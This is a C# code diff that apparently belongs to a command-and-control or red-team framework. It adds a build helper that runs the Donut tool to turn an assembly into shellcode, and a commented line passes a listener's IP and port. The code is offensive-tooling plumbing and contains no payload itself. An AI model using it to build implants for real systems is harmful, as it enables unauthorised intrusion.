@@ -21,6 +21,8 @@ namespace Commander.Internal
 
         public static string NimPath { get; set; } = "/usr/bin/nim";
 
+        public static string DonutPath { get; set; } = "/opt/donut/donut";
+
         public static List<string> ComputeNimBuildParameters(string scriptName, string outFile, bool isDebug, bool isDll)
         {
             string path = SourceFolder;
@@ -61,9 +63,6 @@ namespace Commander.Internal
         {
             return BuildHelper.ExecuteCommand(NimPath, parms, SourceFolder);
         }
-
-
-
 
         public static ExecuteResult ExecuteCommand(string fileName, List<string> args, string startIn)
         {
@@ -141,6 +140,29 @@ namespace Commander.Internal
             string base64 = Convert.ToBase64String(bytes);
             return base64;
 
+        }
+
+
+        public static ExecuteResult GenerateBin(string inFile, string outFile, bool x86, string dotNetParams)
+        {
+            var cmd = DonutPath;
+            var inputFile = Path.Combine(SourceFolder, inFile);
+
+            List<string> args = new List<string>();
+            args.Add(inputFile);
+            args.Add("-f 1");
+            if (x86)
+                args.Add("-a 1");
+            else
+                args.Add("-a 2");
+            args.Add($"-o");
+            args.Add(outFile);
+            args.Add($"-p");
+            args.Add(dotNetParams);
+
+            //string args = $"'{inputFile}' -f 1 -a 2 -o '{outFile}' -p '{listener.Ip}:{listener.BindPort}'";
+            var ret = ExecuteCommand(cmd, args, SourceFolder);
+            return ret;
         }
     }
 
